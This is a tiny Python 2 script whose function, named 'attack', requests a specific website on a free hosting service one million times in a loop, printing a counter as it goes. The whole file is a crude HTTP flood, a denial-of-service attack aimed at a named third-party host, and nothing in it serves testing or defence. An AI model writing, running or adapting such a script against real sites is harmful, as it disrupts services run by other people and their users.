import urllib2
domain = 'ympt.000webhostapp.com'

i = 0

def attack():
    urllib2.urlopen("http://{}".format(domain)).read()


for i in range(0,1000000):
    print i
    attack()


